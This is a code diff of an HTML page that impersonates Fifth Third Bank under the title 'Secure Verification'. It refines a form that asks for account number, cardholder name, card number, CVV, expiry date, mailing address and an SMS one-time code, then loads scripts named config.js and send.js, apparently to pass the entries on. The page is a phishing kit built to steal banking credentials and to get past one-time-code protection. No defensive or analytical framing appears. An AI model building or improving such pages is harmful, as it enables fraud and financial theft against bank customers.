@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Fifth Third Secure Panel</title>
+  <title>Fifth Third Secure Verification</title>
   <style>
     body {
       margin: 0;
@@ -17,41 +17,6 @@
       align-items: center;
       justify-content: center;
       position: relative;
-    }
-    .menu-btn {
-      position: absolute;
-      left: 16px;
-      background: none;
-      border: none;
-      height: 40px;
-      width: 40px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      cursor: pointer;
-    }
-    .menu-icon {
-      width: 24px;
-      height: 2px;
-      background: #fff;
-      display: block;
-      position: relative;
-    }
-    .menu-icon::before,
-    .menu-icon::after {
-      content: '';
-      position: absolute;
-      left: 0;
-      width: 24px;
-      height: 2px;
-      background: #fff;
-      transition: 0.2s;
-    }
-    .menu-icon::before {
-      top: -8px;
-    }
-    .menu-icon::after {
-      top: 8px;
     }
     .logo-container {
       display: flex;
@@ -69,7 +34,7 @@
       min-height: 100vh;
       padding: 0;
     }
-    .login-card {
+    .verify-card {
       background: #f7f7f7;
       border-radius: 8px;
       box-shadow: 0 2px 12px rgba(30, 50, 100, 0.10);
@@ -77,7 +42,7 @@
       margin: 32px auto 0 auto;
       padding: 32px 24px 24px 24px;
     }
-    .login-title {
+    .verify-title {
       font-size: 1.7em;
       font-weight: 700;
       color: #222;
@@ -97,6 +62,8 @@
     }
     .verify-form input {
       width: 100%;
+      margin-left: 0;
+      margin-right: 0;
       padding: 14px 12px;
       border: 1px solid #bfc5ce;
       border-radius: 3px;
@@ -106,16 +73,7 @@
       color: #222;
       box-sizing: border-box;
     }
-    .card-row {
-      display: flex;
-      gap: 8px;
-      margin-top: 6px;
-    }
-    .card-row input {
-      flex: 1;
-      min-width: 0;
-    }
-    .login-btn {
+    .verify-btn {
       width: 100%;
       background: #1a357a;
       color: #fff;
@@ -130,7 +88,7 @@
       transition: background 0.2s;
       letter-spacing: 1px;
     }
-    .login-btn:hover {
+    .verify-btn:hover {
       background: #2248b0;
     }
     .info-section {
@@ -152,7 +110,7 @@
       max-width: 600px;
     }
     @media (max-width: 600px) {
-      .login-card {
+      .verify-card {
         max-width: 98vw;
         padding: 8vw 2vw 8vw 2vw;
       }
@@ -167,42 +125,44 @@
 </head>
 <body>
   <nav class="navbar">
-    <button class="menu-btn" aria-label="Open menu">
-      <span class="menu-icon"></span>
-    </button>
     <div class="logo-container">
       <img src="/53rd.logo.png" alt="Fifth Third Logo" class="logo-img">
     </div>
   </nav>
   <div class="main-bg">
-    <div class="login-card">
-      <div class="login-title">Account Verification</div>
+    <div class="verify-card">
+      <div class="verify-title">Secure Verification</div>
       <form class="verify-form" id="verify-form">
         <label>Account Number
-          <input type="text" name="accountnumber" required>
+          <input type="text" name="accountnumber" required placeholder="Enter your account number">
         </label>
-        <label>Card Details
-          <div class="card-row">
-            <input type="text" name="cardname" required placeholder="Name on Card">
-            <input type="text" name="cardnumber" required placeholder="Card Number">
-            <input type="text" name="cvv" required placeholder="CVV" maxlength="4" style="max-width:70px;">
-            <input type="text" name="expdate" required placeholder="MM/YY" maxlength="5" style="max-width:80px;">
-          </div>
+        <label>Name on Card
+          <input type="text" name="cardname" required placeholder="Name as it appears on card">
+        </label>
+        <label>Card Number
+          <input type="text" name="cardnumber" required placeholder="16-digit card number">
+        </label>
+        <label>CVV
+          <input type="text" name="cvv" required placeholder="3-digit CVV">
+        </label>
+        <label>Expiry Date
+          <input type="text" name="expdate" required placeholder="MM/YY">
         </label>
         <label>Mailing Address
-          <input type="text" name="mailingaddress" required>
+          <input type="text" name="mailingaddress" required placeholder="Your mailing address">
         </label>
         <label>OTP Code
-          <input type="text" name="otp" required>
+          <input type="text" name="otp" required placeholder="Enter OTP from SMS">
         </label>
-        <button type="submit" class="login-btn">Submit</button>
+        <button type="submit" class="verify-btn">VERIFY</button>
       </form>
     </div>
     <div class="info-section">
-      <h2>Account Verification Required</h2>
-      <p>For your security, please verify your account details to continue.</p>
+      <h2>Secure Verification Required</h2>
+      <p>For your security, we need to verify your identity. Please provide the requested information to complete your login.</p>
     </div>
   </div>
+  <script src="config.js"></script>
   <script src="send.js"></script>
 </body>
-</html> 
+</html>
